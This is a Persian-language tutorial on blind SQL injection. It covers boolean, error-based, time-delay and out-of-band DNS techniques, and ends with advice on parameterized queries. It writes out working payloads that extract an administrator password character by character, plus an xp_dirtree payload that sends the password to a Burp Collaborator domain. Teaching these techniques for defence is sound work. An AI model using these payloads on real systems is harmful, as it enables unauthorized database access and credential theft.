تزریق SQL کور

در این بخش، تکنیک‌هایی برای پیدا کردن و بهره‌برداری از آسیب‌پذیری‌های تزریق SQL کور توضیح داده شده است.

تزریق SQL کور چیست؟

تزریق SQL کور زمانی رخ می‌دهد که یک برنامه به تزریق SQL آسیب‌پذیر باشد، اما پاسخ‌های HTTP آن شامل نتایج پرس‌وجوی SQL مرتبط یا جزئیات خطاهای پایگاه داده نمی‌شود.

بسیاری از تکنیک‌ها، مانند حملات UNION، برای آسیب‌پذیری‌های تزریق SQL کور مؤثر نیستند. دلیل آن این است که این تکنیک‌ها متکی به دیدن نتایج پرس‌وجوی تزریق شده در پاسخ‌های برنامه هستند. با این حال، هنوز امکان بهره‌برداری از تزریق SQL کور برای دسترسی به داده‌های غیرمجاز وجود دارد، اما باید از تکنیک‌های متفاوتی استفاده کرد.

بهره‌برداری از تزریق SQL کور با ایجاد پاسخ‌های شرطی

یک برنامه را در نظر بگیرید که از کوکی‌های ردیابی برای جمع‌آوری تحلیل‌های استفاده بهره می‌برد. درخواست‌های ارسال شده به برنامه شامل هدر کوکی مشابه زیر است:

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

هنگامی که یک درخواست حاوی کوکی TrackingId پردازش می‌شود، برنامه از یک پرس‌وجوی SQL برای تعیین اینکه آیا این یک کاربر شناخته شده است استفاده می‌کند:

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

این پرس‌وجو به تزریق SQL آسیب‌پذیر است، اما نتایج پرس‌وجو به کاربر بازگردانده نمی‌شود. با این حال، برنامه رفتار متفاوتی نشان می‌دهد، بسته به اینکه آیا پرس‌وجو داده‌ای بازمی‌گرداند یا نه. اگر یک TrackingId شناسایی شده ارسال کنید، پرس‌وجو داده‌ای بازمی‌گرداند و شما در پاسخ یک پیام "خوش آمدید" دریافت می‌کنید.

این رفتار برای بهره‌برداری از آسیب‌پذیری تزریق SQL کور کافی است. شما می‌توانید اطلاعات را با ایجاد پاسخ‌های مختلف به صورت شرطی و بسته به یک شرط تزریق شده بازیابی کنید.

برای درک نحوه کار این حمله، فرض کنید که دو درخواست ارسال شده حاوی مقادیر زیر برای کوکی TrackingId به ترتیب ارسال می‌شوند:

…xyz' AND '1'='1
…xyz' AND '1'='2
  • اولین مقدار باعث می‌شود پرس‌وجو نتایج را بازگرداند، زیرا شرط تزریق شده AND '1'='1 صحیح است. در نتیجه، پیام "خوش آمدید" نمایش داده می‌شود.
  • مقدار دوم باعث می‌شود که پرس‌وجو هیچ نتیجه‌ای بازنگرداند، زیرا شرط تزریق شده نادرست است. پیام "خوش آمدید" نمایش داده نمی‌شود.

    • این به ما امکان می‌دهد پاسخ هر شرط تزریق شده را تعیین کنیم و داده‌ها را یک به یک استخراج کنیم.

    برای مثال، فرض کنید جدولی به نام Users با ستون‌های Username و Password وجود دارد و کاربری به نام Administrator در این جدول موجود است. شما می‌توانید رمز عبور این کاربر را با ارسال مجموعه‌ای از ورودی‌ها برای بررسی رمز عبور به صورت کاراکتر به کاراکتر تعیین کنید.

    برای انجام این کار، با ورودی زیر شروع کنید:

    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm

    این ورودی پیام "خوش آمدید" را برمی‌گرداند، که نشان می‌دهد شرط تزریق شده صحیح است، بنابراین اولین کاراکتر رمز عبور بزرگ‌تر از m است.

    سپس، ورودی زیر را ارسال می‌کنیم:

    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't

    این ورودی پیام "خوش آمدید" را برنمی‌گرداند، که نشان می‌دهد شرط تزریق شده نادرست است، بنابراین اولین کاراکتر رمز عبور بزرگ‌تر از t نیست.

    در نهایت، ورودی زیر را ارسال می‌کنیم که پیام "خوش آمدید" را برمی‌گرداند و تأیید می‌کند که اولین کاراکتر رمز عبور s است:

    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's

    ما می‌توانیم این فرآیند را ادامه دهیم تا به صورت سیستماتیک رمز عبور کامل کاربر Administrator را تعیین کنیم.

    توجه
    تابع SUBSTRING در برخی از انواع پایگاه داده به نام SUBSTR فراخوانی می‌شود. برای جزئیات بیشتر، به برگه تقلب تزریق SQL مراجعه کنید.

    تزریق SQL مبتنی بر خطا

    تزریق SQL مبتنی بر خطا به مواردی اشاره دارد که در آن شما می‌توانید از پیام‌های خطا برای استخراج یا استنباط داده‌های حساس از پایگاه داده استفاده کنید، حتی در شرایط کور. امکان‌پذیری این امر به تنظیمات پایگاه داده و نوع خطاهایی که می‌توانید ایجاد کنید بستگی دارد:

  • ممکن است بتوانید برنامه را وادار کنید تا بر اساس نتیجه یک عبارت بولی یک پاسخ خطای خاص بازگرداند. می‌توانید از این روش همانند پاسخ‌های شرطی که در بخش قبلی بررسی کردیم، بهره‌برداری کنید. برای اطلاعات بیشتر، به بهره‌برداری از تزریق SQL کور با ایجاد خطاهای شرطی مراجعه کنید.
  • ممکن است بتوانید خطاهایی ایجاد کنید که داده‌های بازگشتی از پرس‌وجو را خروجی دهند. این به طور مؤثر آسیب‌پذیری‌های تزریق SQL کور را به آسیب‌پذیری‌های قابل مشاهده تبدیل می‌کند. برای اطلاعات بیشتر، به استخراج داده‌های حساس از طریق پیام‌های خطای SQL تفصیلی مراجعه کنید.


    • بهره‌برداری از تزریق SQL کور با ایجاد خطاهای شرطی

    برخی برنامه‌ها پرس‌وجوهای SQL را اجرا می‌کنند، اما رفتار آنها تغییر نمی‌کند، بدون توجه به اینکه آیا پرس‌وجو داده‌ای باز می‌گرداند یا خیر. تکنیک ارائه شده در بخش قبلی در اینجا کار نمی‌کند، زیرا تزریق شرایط بولی مختلف تفاوتی در پاسخ‌های برنامه ایجاد نمی‌کند.

    اغلب می‌توان برنامه را وادار کرد تا پاسخ متفاوتی بر اساس وقوع یک خطای SQL بازگرداند. شما می‌توانید پرس‌وجو را طوری تغییر دهید که فقط در صورتی که شرط صحیح باشد، یک خطای پایگاه داده ایجاد کند. اغلب، یک خطای مدیریت نشده که توسط پایگاه داده ایجاد می‌شود، باعث ایجاد تفاوت در پاسخ برنامه می‌شود، مانند یک پیام خطا. این امر به شما امکان می‌دهد که درستی شرط تزریق شده را استنباط کنید.

    برای دیدن نحوه عملکرد این روش، فرض کنید که دو درخواست ارسال شده حاوی مقادیر زیر برای کوکی TrackingId به ترتیب ارسال می‌شوند:

    xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

    این ورودی‌ها از کلمه کلیدی CASE برای آزمایش یک شرط و بازگرداندن یک عبارت متفاوت بسته به صحت یا نادرستی آن استفاده می‌کنند:

  • با ورودی اول، عبارت CASE به 'a' ارزیابی می‌شود، که باعث هیچ خطایی نمی‌شود.
  • با ورودی دوم، عبارت CASE به 1/0 ارزیابی می‌شود، که باعث یک خطای تقسیم بر صفر می‌شود.

    • اگر این خطا باعث ایجاد تفاوتی در پاسخ HTTP برنامه شود، می‌توانید از این روش برای تعیین درستی شرط تزریق شده استفاده کنید.

    با استفاده از این تکنیک، می‌توانید داده‌ها را با آزمایش یک کاراکتر در هر بار استخراج کنید:

    xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
    توجه
    روش‌های مختلفی برای ایجاد خطاهای شرطی وجود دارد و تکنیک‌های مختلف برای انواع مختلف پایگاه داده بهترین عملکرد را دارند. برای جزئیات بیشتر، به برگه تقلب تزریق SQL مراجعه کنید.


    استخراج داده‌های حساس از طریق پیام‌های خطای SQL تفصیلی

    پیکربندی نادرست پایگاه داده گاهی اوقات منجر به پیام‌های خطای تفصیلی می‌شود. این پیام‌ها ممکن است اطلاعات مفیدی را برای مهاجم فراهم کنند. به عنوان مثال، پیام خطای زیر را در نظر بگیرید که پس از تزریق یک تک‌نقل در پارامتر id رخ می‌دهد:

    Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char

    این پیام، پرس‌وجوی کاملی را که برنامه با استفاده از ورودی ما ساخته است، نشان می‌دهد. می‌بینیم که در این مورد، ما در حال تزریق به یک رشته تک‌نقل شده در یک عبارت WHERE هستیم. این امر ساخت یک پرس‌وجوی معتبر که حاوی بار مخرب باشد را آسان‌تر می‌کند. استفاده از کامنت برای نادیده گرفتن ادامه پرس‌وجو می‌تواند از شکستن نحوی توسط تک‌نقل اضافی جلوگیری کند.

    گاهی ممکن است بتوانید برنامه را وادار کنید که یک پیام خطا تولید کند که شامل برخی از داده‌های بازگردانده شده توسط پرس‌وجو باشد. این به طور مؤثر یک آسیب‌پذیری تزریق SQL کور را به یک آسیب‌پذیری قابل مشاهده تبدیل می‌کند.

    می‌توانید از تابع CAST() برای دستیابی به این هدف استفاده کنید. این تابع به شما امکان می‌دهد یک نوع داده را به نوع دیگر تبدیل کنید. به عنوان مثال، یک پرس‌وجو را تصور کنید که شامل عبارت زیر است:

    CAST((SELECT example_column FROM example_table) AS int)

    اغلب، داده‌هایی که می‌خواهید بخوانید یک رشته است. تلاش برای تبدیل این داده به یک نوع داده ناسازگار، مانند int، ممکن است خطایی مشابه زیر ایجاد کند:

    ERROR: invalid input syntax for type integer: "Example data"

    این نوع پرس‌وجو ممکن است زمانی که محدودیت کاراکتر شما را از ایجاد پاسخ‌های شرطی باز می‌دارد نیز مفید باشد.



    بهره‌برداری از تزریق SQL کور با ایجاد تأخیر زمانی

    اگر برنامه خطاهای پایگاه داده را در زمان اجرای پرس‌وجوی SQL شناسایی کرده و به درستی مدیریت کند، هیچ تفاوتی در پاسخ برنامه مشاهده نمی‌شود. این بدان معناست که تکنیک قبلی برای ایجاد خطاهای شرطی کار نمی‌کند.

    در این شرایط، اغلب می‌توان از آسیب‌پذیری تزریق SQL کور با ایجاد تأخیر زمانی بر اساس صحیح یا غلط بودن یک شرط تزریق شده استفاده کرد. از آنجایی که پرس‌وجوهای SQL به صورت همزمان توسط برنامه پردازش می‌شوند، تأخیر در اجرای یک پرس‌وجوی SQL باعث تأخیر در پاسخ HTTP می‌شود. این به شما امکان می‌دهد که درستی شرط تزریق شده را بر اساس زمان پاسخ HTTP تعیین کنید.

    تکنیک‌های ایجاد تأخیر زمانی وابسته به نوع پایگاه داده مورد استفاده هستند. به عنوان مثال، در Microsoft SQL Server، می‌توانید از موارد زیر برای آزمایش یک شرط و ایجاد تأخیر استفاده کنید:

    '; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
  • اولین ورودی تأخیری ایجاد نمی‌کند، زیرا شرط 1=2 غلط است.
  • ورودی دوم باعث ایجاد تأخیر 10 ثانیه‌ای می‌شود، زیرا شرط 1=1 صحیح است.

    • با استفاده از این تکنیک، می‌توان داده‌ها را با آزمایش یک کاراکتر در هر بار استخراج کرد:

    '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
    توجه
    روش‌های مختلفی برای ایجاد تأخیر زمانی در داخل پرس‌وجوهای SQL وجود دارد و تکنیک‌های مختلف برای انواع مختلف پایگاه داده مناسب هستند. برای اطلاعات بیشتر، به برگه تقلب تزریق SQL مراجعه کنید.


    بهره‌برداری از تزریق SQL کور با استفاده از تکنیک‌های خارج از باند (OAST)

    ممکن است برنامه همان پرس‌وجوی SQL مثال قبلی را انجام دهد اما به صورت غیرهمزمان. برنامه پردازش درخواست کاربر را در رشته اصلی ادامه می‌دهد و از یک رشته دیگر برای اجرای پرس‌وجوی SQL با استفاده از کوکی رهگیری استفاده می‌کند. پرس‌وجو همچنان به تزریق SQL آسیب‌پذیر است، اما هیچ یک از تکنیک‌های ذکر شده تاکنون کار نمی‌کند. پاسخ برنامه به بازگشت داده، بروز خطای پایگاه داده یا زمان اجرای پرس‌وجو وابسته نیست.

    در این شرایط، اغلب می‌توان از آسیب‌پذیری تزریق SQL کور با ایجاد تعاملات شبکه‌ای خارج از باند به سیستمی که کنترل می‌کنید بهره‌برداری کرد. این تعاملات را می‌توان بر اساس یک شرط تزریق شده تحریک کرد تا اطلاعات را به تدریج استنباط کرد. مفیدتر از این، داده‌ها می‌توانند مستقیماً در تعاملات شبکه‌ای استخراج شوند.

    برای این منظور، از پروتکل‌های شبکه مختلفی می‌توان استفاده کرد، اما معمولاً موثرترین آن‌ها DNS (سرویس نام دامنه) است. بسیاری از شبکه‌های تولیدی اجازه خروج آزادانه درخواست‌های DNS را می‌دهند، زیرا برای عملکرد عادی سیستم‌های تولیدی ضروری هستند.

    ساده‌ترین و قابل اعتمادترین ابزار برای استفاده از تکنیک‌های خارج از باند، Burp Collaborator است. این سرور، پیاده‌سازی‌های سفارشی از خدمات شبکه مختلف از جمله DNS را ارائه می‌دهد. این ابزار به شما امکان می‌دهد تا متوجه شوید که تعاملات شبکه‌ای چه زمانی به دلیل ارسال بارهای فردی به یک برنامه آسیب‌پذیر رخ می‌دهند. Burp Suite Professional شامل یک کلاینت داخلی است که برای کار با Burp Collaborator به صورت پیش‌فرض پیکربندی شده است. برای اطلاعات بیشتر، به مستندات Burp Collaborator مراجعه کنید.

    تکنیک‌های ایجاد یک درخواست DNS به نوع پایگاه داده مورد استفاده بستگی دارد. به عنوان مثال، ورودی زیر در Microsoft SQL Server می‌تواند برای انجام یک جستجوی DNS در یک دامنه مشخص استفاده شود:

    '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--

    این باعث می‌شود پایگاه داده یک جستجوی DNS برای دامنه زیر انجام دهد:

    0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net

    می‌توانید از Burp Collaborator برای تولید یک زیر دامنه منحصر به فرد استفاده کرده و سرور Collaborator را برای تأیید زمانی که هر جستجوی DNS رخ می‌دهد، بررسی کنید.

    با تأیید یک روش برای ایجاد تعاملات خارج از باند، می‌توانید از این کانال برای استخراج داده‌ها از برنامه آسیب‌پذیر استفاده کنید. به عنوان مثال:

    '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--

    این ورودی رمز عبور کاربر Administrator را خوانده، یک زیر دامنه منحصربه‌فرد Collaborator را به آن اضافه کرده و یک جستجوی DNS را آغاز می‌کند. این جستجو به شما امکان می‌دهد رمز عبور استخراج شده را مشاهده کنید:

    S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net

    چگونه از حملات تزریق SQL کور جلوگیری کنیم؟

    اگرچه تکنیک‌های لازم برای یافتن و بهره‌برداری از آسیب‌پذیری‌های تزریق SQL کور متفاوت و پیشرفته‌تر از تزریق SQL معمولی هستند، اما اقدامات لازم برای جلوگیری از تزریق SQL یکسان هستند.

    همانند تزریق SQL معمولی، حملات تزریق SQL کور می‌توانند با استفاده دقیق از پرس‌وجوهای پارامتری‌شده جلوگیری شوند. این پرس‌وجوها اطمینان حاصل می‌کنند که ورودی کاربر نمی‌تواند با ساختار پرس‌وجوی SQL مورد نظر تداخل داشته باشد.
